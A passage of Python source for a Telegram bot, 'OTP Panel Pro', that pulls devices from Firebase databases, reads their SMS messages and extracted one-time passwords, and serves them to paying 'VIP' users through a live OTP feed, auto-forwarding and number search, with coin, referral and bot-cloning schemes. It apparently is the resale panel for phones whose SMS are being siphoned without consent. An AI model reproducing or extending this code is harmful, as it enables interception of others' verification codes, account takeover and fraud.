# ════════════════════════════════════════════════════════════

def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("🔐 Private OTP"),  KeyboardButton("💸 Refer & Earn")],
    ]
    if bot_token == TOKEN:
        bots_created = all_users.get(chat_id, {}).get("bots_created", 0) if chat_id else 0
        req_bot_coins = 20 + (bots_created * 10)
        keys.append([KeyboardButton(f"🤖 Create Your Bot ({req_bot_coins} Coins)")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True, input_field_placeholder="Choose an option…")


def vip_lock_text(is_main_bot: bool) -> str:
    if not is_main_bot:
        return ("🚫 <b>PREMIUM ACCESS REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\n"
                "Ye feature sirf premium members ke liye hai.\n"
                "Access ke liye bot owner se contact karein.")
    return ("👑 <b>PREMIUM FEATURE LOCKED</b>\n━━━━━━━━━━━━━━━━━━\n"
            "<b>Devices List</b> aur saare live features sirf <b>VIP members</b> ke liye hain.\n\n"
            "💎 <b>VIP me kya milta hai:</b>\n"
            "✅ Full Device List access\n"
            "✅ Live OTP auto-forwarding\n"
            "✅ Number Search across all panels\n"
            "✅ /recent live OTP feed\n\n"
            f"🗄 Connected servers: <b>{len(DATABASES)}+</b>\n"
            f"💰 Price: <b>{VIP_PRICE_COINS} Coins = {VIP_DURATION_HOURS} Hours VIP</b>\n"
            "💸 Free kaise le: <b>1 Referral = +10 Coins</b>\n"
            "🎁 New users ko <b>10 bonus coins</b> mile hain!\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Neeche <b>👑 Buy VIP</b> dabayein — turant unlock ho jayega 👇")


def vip_lock_markup(is_main_bot: bool, chat_id: int) -> InlineKeyboardMarkup:
    if not is_main_bot:
        return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]])
    return get_vip_denied_keyboard(chat_id)


def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"👑 Buy VIP ({VIP_PRICE_COINS} Coins = {VIP_DURATION_HOURS} Hours)",
                              callback_data="buy_vip")],
        [InlineKeyboardButton("💸 Share Referral Link & Earn Coins",
                              url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")],
    ])


def device_label(d: Device) -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"


def device_list_header(devices: list[Device], page: int = 0) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    return (
        "✨ <b>OTP PANEL PRO</b> ✨\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Online: <b>{online}</b>   🔴 Offline: <b>{offline}</b>\n"
        f"📱 Total: <b>{len(devices)}</b> Devices\n"
        f"📄 Page {page + 1} of {total_pages}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "Select a number below to connect and receive its OTPs:"
    )


def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    page_devs = devices[start: start + PAGE_SIZE]
    rows = []

    def _btn(d: Device):
        tag = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}"
        else:
            lbl = f"{icon} ⚙️ {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs:
        rows.append([_btn(d)])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"),
                 InlineKeyboardButton("🔍 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)


def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 📱 {tag}{' & '.join(d.numbers)}"
            else:
                lbl = f"🟢 ⚙️ {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("😴 No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"),
                 InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)


def format_sms_block(sms: dict, num_label: str):
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sim = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    lines = []
    if otp: lines.append(f"🔑 OTP: <code>{otp}</code>")
    lines.append(f"👤 From: {sender}\n📅 Date: {date}")
    if sim: lines.append(f"📡 SIM: {sim}")
    lines.append(f"📱 Number: {num_label}\n\n💬 Message: {body}")
    return "\n".join(lines), otp


def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sim = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    if otp:
        sim_line = f"│ 📡 SIM : {sim}\n" if sim else ""
        return (f"✨ <b>NEW OTP RECEIVED</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
                f"│ 🔑 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n"
                f"│ 👤 From : {sender}\n│ 📅 Date : {date}\n{sim_line}"
                f"━━━━━━━━━━━━━━━━━━\n💬 {body}")
    return (f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"📱 Number : {num_label}\n👤 From : {sender}\n📅 Date : {date}\n"
            f"━━━━━━━━━━━━━━━━━━\n💬 {body}")


def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"),
         InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")],
    ])


def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES[bot_token]["users"]
    total = len(users_db)
    verified = sum(1 for u in users_db.values() if u.get("verified"))
    unverified = total - verified
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    active_chats = len(chats_registry.get(bot_token, set()))
    text = (f"🛡 <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users    : <b>{total}</b>\n✅ Verified Users : <b>{verified}</b>\n"
            f"⏳ Unverified     : <b>{unverified}</b>\n📡 Active Chats   : <b>{active_chats}</b>\n"
            f"🏆 Total OTP Views: <b>{total_otps}</b>\n")
    if bot_token == TOKEN:
        text += (f"🤖 Cloned Bots    : <b>{len(CLONES)}</b>\n"
                 f"🗄 Databases       : <b>{len(DATABASES)}</b>\n"
                 f"🔐 Private DBs     : <b>{total_private_dbs()}</b>\n")
    text += f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text


def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("👥 User List", callback_data="admin_users")],
        [InlineKeyboardButton("🎁 Gift Coins to All", callback_data="admin_gift_coins")],
        [InlineKeyboardButton("➕ Add Firebase URL(s)", callback_data="admin_add_firebase")],
    ]
    if bot_token != TOKEN:
        keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
    keys.append([InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
                 InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(keys)


async def _private_dbs_view(chat_id: int) -> tuple[str, InlineKeyboardMarkup]:
    dbs = PRIVATE_DBS.get(chat_id, [])
    lines = [
        "🔐 <b>PRIVATE OTP DATABASES</b>",
        "━━━━━━━━━━━━━━━━━━",
        "Ye databases <b>sirf aapko</b> dikhte hain — dusre users access nahi kar sakte.",
        "",
    ]
    if not dbs:
        lines.append("📭 Abhi koi private DB nahi hai. Neeche se add karein.")
    else:
        for i, pdb in enumerate(dbs, 1):
            devs = PRIVATE_DEVICE_CACHE.get(pdb["url"], [])
            online = sum(1 for d in devs if d.status == "online")
            lines.append(f"<b>{i}.</b> {pdb['name']} — {len(devs)} devices  🟢 {online}")
            lines.append(f"     ⏱ {pdb['added_at']}")
    lines.append("")
    lines.append(f"📊 Total private DBs: <b>{len(dbs)}</b>  ♾️ <i>unlimited</i>")
    lines.append("🔒 <i>Private DBs cannot be deleted by users.</i>")

    rows = []
    for i, pdb in enumerate(dbs):
        rows.append([InlineKeyboardButton(f"📱 Open {pdb['name']}",
                                          callback_data=f"priv_open:{i}")])
    rows.append([InlineKeyboardButton("➕ Add Private DB", callback_data="priv_add")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="priv_refresh"),
                 InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return "\n".join(lines), InlineKeyboardMarkup(rows)


async def safe_edit(query, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    if query is None:
        return
    try:
        await query.edit_message_text(
            text, reply_markup=reply_markup, parse_mode=parse_mode,
            disable_web_page_preview=disable_web_page_preview)
    except BadRequest as e:
        if "not modified" in str(e).lower():
            return
        try:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=None,
                                          disable_web_page_preview=disable_web_page_preview)
        except Exception:
            tlog(f"Edit Message Error: {e}")
    except (Forbidden, RetryAfter) as e:
        if isinstance(e, RetryAfter):
            try:
                await asyncio.sleep(e.retry_after + 0.5)
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=None,
                                              disable_web_page_preview=disable_web_page_preview)
            except Exception:
                pass
        else:
            tlog("Edit skipped: bot blocked by user (Forbidden).")
    except TelegramError as e:
        tlog(f"Edit Message Error: {e}")
    except Exception as e:
        tlog(f"Edit Unexpected Error: {e}")


async def safe_answer(query, text: str = None, show_alert: bool = False) -> None:
    if query is None:
        return
    try:
        if text is None:
            await query.answer()
        else:
            await query.answer(text, show_alert=show_alert)
    except Exception:
        pass

# ════════════════════════════════════════════════════════════
#  PERSISTENCE
# ════════════════════════════════════════════════════════════

def _sync_save_data():
    try:
        clones_to_save = {}
        for t, d in CLONES.items():
            clones_to_save[t] = {
                "creator": d.get("creator"), "expiry": d.get("expiry"),
                "custom_db": d.get("custom_db"), "users": d.get("users", {}),
                "username": d.get("username", ""),
            }
        with open(DB_FILE, "w") as f:
            json.dump({
                "all_users": all_users,
                "CLONES": clones_to_save,
                "PRIVATE_DBS": {str(k): v for k, v in PRIVATE_DBS.items()},
            }, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")


async def save_data_async():
    async with _save_lock:
        await asyncio.to_thread(_sync_save_data)


def load_data():
    global all_users, CLONES, PRIVATE_DBS
    if not os.path.exists(DB_FILE):
        return
    try:
        with open(DB_FILE, "r") as f:
            data = json.load(f)
        for k, v in data.get("all_users", {}).items():
            all_users[int(k)] = v
        for t, d in data.get("CLONES", {}).items():
            restored = {}
            for uk, uv in d.get("users", {}).items():
                restored[int(uk)] = uv
            d["users"] = restored
            CLONES[t] = d
        for k, v in data.get("PRIVATE_DBS", {}).items():
            try:
                PRIVATE_DBS[int(k)] = v
            except Exception:
                pass
    except Exception as e:
        tlog(f"Load Data Error: {e}")


async def auto_save_loop():
    while True:
        try:
            await asyncio.sleep(60)
            await save_data_async()
        except asyncio.CancelledError:
            await save_data_async()
            raise
        except Exception as e:
            tlog(f"Auto-save loop recovered: {e}")

# ════════════════════════════════════════════════════════════
#  HANDLERS — START / CONTEXT / BASIC CMDS
# ════════════════════════════════════════════════════════════

async def send_bonus_if_applicable(ctx, chat_id: int, users_db: dict, is_main_bot: bool):
    if is_main_bot and not users_db[chat_id].get("bonus_10_received"):
        users_db[chat_id]["bonus_10_received"] = True
        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
        try:
            await ctx.bot.send_message(
                chat_id,
                "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\n"
                "Ab sirf <b>1 refer</b> (10 coins) aur karo aur khudka OTP bot banao 24 hours ke liye!\n\n"
                "Click '💸 Refer & Earn' to get your link.", parse_mode="HTML")
        except Exception:
            pass


def _bot_context(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int):
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    if not is_main_bot:
        if bot_token not in CLONES:
            return bot_token, is_main_bot, {}, False, False
        expired = time.time() > CLONES[bot_token].get("expiry", 0)
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
        return bot_token, is_main_bot, users_db, is_admin, expired
    return bot_token, is_main_bot, all_users, (chat_id in ADMIN_IDS), False


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    bot_token, is_main_bot, users_db, is_admin, expired = _bot_context(ctx, chat_id)

    if not is_main_bot:
        if bot_token not in CLONES:
            return
        if expired:
            try:
                await update.message.reply_text("Aapka premium khatam ho gaya, isliye aapka bot off kiya humne.")
            except TelegramError:
                pass
            return

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)

    if users_db.get(chat_id, {}).get("banned"):
        try:
            await update.message.reply_text("🚫 You are banned from using this bot.")
        except TelegramError:
            pass
        return

    ref_id = None
    if ctx.args and ctx.args[0].isdigit():
        ref_id = int(ctx.args[0])

    if chat_id not in users_db:
        users_db[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified": False, "referrals": 0, "coins": 0,
            "vip_until": 0.0, "otp_count": 0, "bots_created": 0,
            "bonus_10_received": False,
            "referred_by": ref_id if ref_id != chat_id else None,
            "banned": False,
        }
        if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
            users_db[ref_id]["referrals"] += 1
            users_db[ref_id]["coins"] += 10
            try:
                await ctx.bot.send_message(ref_id, "🎉 You have a new referral! +10 Coins added.")
            except Exception:
                pass

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if not users_db[chat_id].get("verified"):
        await send_join_prompt(update, is_main_bot)
        return

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    text = ("✨ <b>OTP PANEL PRO EDITION</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
            f"Welcome, <b>{user.first_name if user else 'User'}</b>!\n"
            "System is connected and fully operational.\n"
            "Use the menu at the bottom of your screen to navigate.")
    try:
        await update.message.reply_text(text, parse_mode="HTML",
                                        reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
    except TelegramError as e:
        tlog(f"Welcome send failed: {e}")


async def cmd_recent(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token, is_main_bot, users_db, is_admin, expired = _bot_context(ctx, chat_id)

    if not is_main_bot:
        if bot_token not in CLONES or expired:
            return
    if users_db.get(chat_id, {}).get("banned"):
        return
    if not is_vip(bot_token, chat_id):
        try:
            await update.message.reply_text(vip_lock_text(is_main_bot), parse_mode="HTML",
                                            reply_markup=vip_lock_markup(is_main_bot, chat_id))
        except TelegramError:
            pass
        return

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    wait_msg = await update.message.reply_text("⏳ <b>Scanning live OTP feed…</b>", parse_mode="HTML")
    devices = await get_all_devices(bot_token, chat_id)
    scan_devs = devices[:40]

    async def scan_one(d: Device):
        try:
            smss = await get_device_sms(d, 20)
            out = []
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                if otp:
                    out.append({
                        "otp": otp, "label": device_label(d),
                        "sender": sms.get("sender") or "Unknown",
                        "tag": d.db_tag, "ts": sms.get("timestamp") or 0,
                    })
            return out
        except Exception:
            return []

    results = await asyncio.gather(*(scan_one(d) for d in scan_devs), return_exceptions=True)
    found = []
    for res in results:
        if isinstance(res, list):
            found.extend(res)
    found.sort(key=lambda x: float(x["ts"] or 0), reverse=True)
    seen_pair = set()
    feed = []
    for item in found:
        key = (item["otp"], item["label"])
        if key in seen_pair:
            continue
        seen_pair.add(key)
        feed.append(item)
        if len(feed) >= 10:
            break

    if not feed:
        try:
            await wait_msg.edit_text(
                "📭 <b>NO LIVE OTPs RIGHT NOW</b>\n━━━━━━━━━━━━━━━━━━\n"
                "Kisi bhi connected number par abhi koi OTP receive nahi hua.\n"
                "Jaise hi naya OTP aayega, yahan turant dikhega.\n\n"
                "💡 Tip: Devices List se kisi number ko connect karein.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📱 Open Devices List", callback_data="home")],
                    [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
        except TelegramError:
            pass
        return

    lines = [f"🔑 <b>LIVE OTP FEED</b> — Last {len(feed)} codes", "━━━━━━━━━━━━━━━━━━"]
    for i, item in enumerate(feed, 1):
        lines.append(
            f"<b>{i:02d}.</b> <code>{item['otp']}</code>\n"
            f"     📱 {item['label']}\n"
            f"     👤 {item['sender']}  •  🗄 {item['tag']}  •  ⏱ {time_ago(item['ts'])}")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("💡 Niche button dabate hi OTP copy ho jayega.")
    lines.append(f"🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}")
    feed_text = "\n".join(lines)
    if len(feed_text) > 4000:
        feed_text = feed_text[:4000] + "\n…"

    btn_rows, row = [], []
    for item in feed:
        row.append(InlineKeyboardButton(f"📋 {item['otp']}", callback_data=f"cp:{item['otp']}"))
        if len(row) == 2:
            btn_rows.append(row)
            row = []
    if row:
        btn_rows.append(row)
    btn_rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="recent_refresh"),
                     InlineKeyboardButton("❌ Close", callback_data="close_msg")])

    try:
        await wait_msg.edit_text(feed_text, parse_mode="HTML",
                                 reply_markup=InlineKeyboardMarkup(btn_rows))
    except TelegramError:
        pass


async def cmd_points(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    users_db = all_users if is_main_bot else CLONES.get(bot_token, {}).get("users", {})
    coins = users_db.get(chat_id, {}).get("coins", 0)
    try:
        await update.message.reply_text(f"💰 Aapke paas {coins} Coins hain.")
    except TelegramError:
        pass


async def cmd_referral(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    try:
        await update.message.reply_text(
            f"💸 <b>Your Referral Link</b>\n\n<code>{ref_link}</code>\n\n1 Refer = +10 Coins 🎁",
            parse_mode="HTML", disable_web_page_preview=True)
    except TelegramError:
        pass


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id in pending_action:
        pending_action.pop(chat_id)
        try:
            await update.message.reply_text("✅ Action cancelled.")
        except TelegramError:
            pass
    else:
        try:
            await update.message.reply_text("ℹ️ No pending action.")
        except TelegramError:
            pass


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    _, is_main_bot, _, is_admin, _ = _bot_context(ctx, chat_id)
    if not is_admin:
        try:
            await update.message.reply_text("ℹ️ Ye command sirf admin ke liye hai.")
        except TelegramError:
            pass
        return
    await handle_admin_command(update, ctx, "/help", chat_id, is_main_bot)


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    _, is_main_bot, _, is_admin, _ = _bot_context(ctx, chat_id)
    if not is_admin:
        try:
            await update.message.reply_text("ℹ️ Ye command sirf admin ke liye hai.")
        except TelegramError:
            pass
        return
    await handle_admin_command(update, ctx, "/stats", chat_id, is_main_bot)


async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token, is_main_bot, users_db, is_admin, expired = _bot_context(ctx, chat_id)
    if not is_admin:
        try:
            await update.message.reply_text("🚫 <b>Access Denied</b>\nYe panel sirf admin ke liye hai.",
                                            parse_mode="HTML")
        except TelegramError:
            pass
        return
    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    try:
        await update.message.reply_text(admin_panel_text(bot_token), parse_mode="HTML",
                                        reply_markup=admin_keyboard(bot_token))
    except TelegramError as e:
        tlog(f"/admin send failed: {e}")


async def _status_payload(bot_token: str) -> str:
    devices = await get_all_devices(bot_token)
    online = sum(1 for d in devices if d.status == "online")
    db_counts = {tag: sum(1 for d in devices if d.db_tag == tag) for tag in set(d.db_tag for d in devices)}
    db_lines = "\n".join([f"🗄 DB {tag}: {count} devices" for tag, count in db_counts.items()])
    return (f"📊 <b>BOT STATUS</b>\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n{db_lines}\n\n"
            f"📱 Total Linked: <b>{len(devices)}</b>\n🟢 Online: <b>{online}</b>  |  🔴 Offline: <b>{len(devices) - online}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}")


def _status_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh Status", callback_data="cmd_status")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")],
    ])


async def cmd_bot_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    bot_token, _, _, is_admin, _ = _bot_context(ctx, chat_id)
    if not is_admin:
        try:
            await update.message.reply_text("🚫 <b>Access Denied</b>\nYe command sirf admin ke liye hai.",
                                            parse_mode="HTML")
        except TelegramError:
            pass
        return
    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    try:
        await update.message.reply_text(await _status_payload(bot_token),
                                        parse_mode="HTML", reply_markup=_status_keyboard())
    except TelegramError as e:
        tlog(f"/status send failed: {e}")


def _leaderboard_text(users_db: dict) -> str:
    sorted_users = sorted(users_db.items(), key=lambda x: x[1].get("otp_count", 0), reverse=True)
    medals = ["🥇", "🥈", "🥉"] + ["🔸"] * 7
    lines = ["🏆 <b>LEADERBOARD — TOP 10</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, (uid, info) in enumerate(sorted_users[:10]):
        lines.append(f"{medals[i]} <b>{info.get('name', 'Unknown')}</b>\n"
                     f"     📩 {info.get('otp_count', 0)} OTPs  |  💰 {info.get('coins', 0)} coins")
    if len(lines) == 2:
        lines.append("Abhi koi data nahi — pehle OTP use karein!")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}")
    return "\n".join(lines)


async def cmd_leaderboard(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    _, _, users_db, _, _ = _bot_context(ctx, chat_id)
    user_focus.setdefault(ctx.bot.token, {}).pop(chat_id, None)
    try:
        await update.message.reply_text(
            _leaderboard_text(users_db), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
    except TelegramError:
        pass


async def cmd_support(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user_focus.setdefault(ctx.bot.token, {}).pop(chat_id, None)
    buttons = [[InlineKeyboardButton(f"📢 {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
    buttons.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    try:
        await update.message.reply_text(
            "💬 <b>SUPPORT & COMMUNITY</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Koi bhi problem ya sawaal ho — neeche diye gaye official channel se judiye.\n"
            "Updates, giveaways aur support sab yahin milta hai 👇",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))
    except TelegramError:
        pass

# ─── CATCH-ALL COMMAND ROUTER ───────────────────────────────

async def on_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    bot_token, is_main_bot, users_db, is_admin, expired = _bot_context(ctx, chat_id)

    if not is_main_bot:
        if bot_token not in CLONES or expired:
            return
    if users_db.get(chat_id, {}).get("banned"):
        return
    if not is_admin:
        return
    if user_guards.is_busy(chat_id):
        return

    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    try:
        handled = await handle_admin_command(update, ctx, text, chat_id, is_main_bot)
        if not handled:
            await update.message.reply_text("❓ Unknown command.\nType /help to see all admin commands.")
    except Exception as e:
        tlog(f"❌ on_command error: {e}")
        try:
            await update.message.reply_text(f"⚠️ Command error: {str(e)[:200]}")
        except Exception:
            pass

# ─── CALLBACK DISPATCHER ────────────────────────────────────

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if query is None:
        return
    data = query.data or ""
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    try:
        chat_id = query.message.chat_id if query.message else query.from_user.id
    except Exception:
        chat_id = query.from_user.id

    if not is_main_bot:
        if bot_token not in CLONES:
            await safe_answer(query, "Bot disabled.", show_alert=True)
            return
        if time.time() > CLONES[bot_token].get("expiry", 0):
            await safe_answer(query, "Premium Expired.", show_alert=True)
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"):
        await safe_answer(query, "🚫 You are banned from using this bot.", show_alert=True)
        return

    if user_guards.is_busy(chat_id):
        await safe_answer(query, "⏳ Processing...", show_alert=False)
        return

    if data != "noop" and user_guards.is_rate_limited(chat_id):
        await safe_answer(query, "⚠️ Please slow down! Do not spam buttons.", show_alert=False)
        return

    await user_guards.acquire(chat_id)
    try:
        await _dispatch_callback(query, ctx, data, chat_id, bot_token, users_db, is_admin, is_main_bot)
    except (BadRequest, Forbidden, RetryAfter, TimedOut) as e:
        tlog(f"Callback telegram error [{data}]: {e}")
        await safe_answer(query, "⚠️ Telegram hiccup — try again.", show_alert=False)
    except Exception as e:
        tlog(f"❌ Callback error [{data}]: {e}")
        await safe_answer(query, "⚠️ An error occurred, please try again.", show_alert=False)
        try:
            if query.message:
                await query.message.reply_text("⚠️ An error occurred, please try again.")
        except Exception:
            pass
    finally:
        user_guards.release(chat_id)


async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str,
                             users_db: dict, is_admin: bool, is_main_bot: bool) -> None:
    await safe_answer(query)

    if data == "noop":
        return

    if data == "close_msg":
        try:
            if query.message:
                await query.message.delete()
        except Exception:
            pass
        return

    # ── BUY VIP ───────────────────────────────────────────
    if data == "buy_vip":
        if not is_main_bot:
            await safe_answer(query, "VIP purchase only available on main bot.", show_alert=True)
            return

        user_coins = users_db.get(chat_id, {}).get("coins", 0)

        if user_coins < VIP_PRICE_COINS:
            need = VIP_PRICE_COINS - user_coins
            await safe_answer(
                query,
                f"❌ Not enough coins.\n\n"
                f"💰 You have: {user_coins}\n"
                f"💎 Need: {need} more\n\n"
                f"💸 1 Referral = +10 Coins",
                show_alert=True)
            return

        users_db.setdefault(chat_id, {})
        users_db[chat_id]["coins"] = user_coins - VIP_PRICE_COINS
        current_vip = users_db[chat_id].get("vip_until", 0.0)
        users_db[chat_id]["vip_until"] = max(time.time(), current_vip) + (VIP_DURATION_HOURS * 3600)

        devices = await get_all_devices(bot_token, chat_id)
        remaining = get_vip_time_left(bot_token, chat_id)
        banner = (f"👑 <b>VIP ACTIVATED!</b>\n━━━━━━━━━━━━━━━━━━\n"
                  f"Aapko <b>{VIP_DURATION_HOURS} hours</b> ka full premium access mil gaya!\n"
                  f"💰 Coins left: <b>{users_db[chat_id]['coins']}</b>\n"
                  f"⏱ VIP valid for: <b>{remaining}</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n\n")
        if not devices:
            await safe_edit(query,
                banner + "📭 <b>No Devices Found</b>\nKuch der baad '🔄 Refresh' dabayein.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="home")],
                    [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return
        await safe_edit(query, banner + device_list_header(devices, 0),
                        reply_markup=device_list_keyboard(devices, 0))
        return

    if data == "recent_refresh":
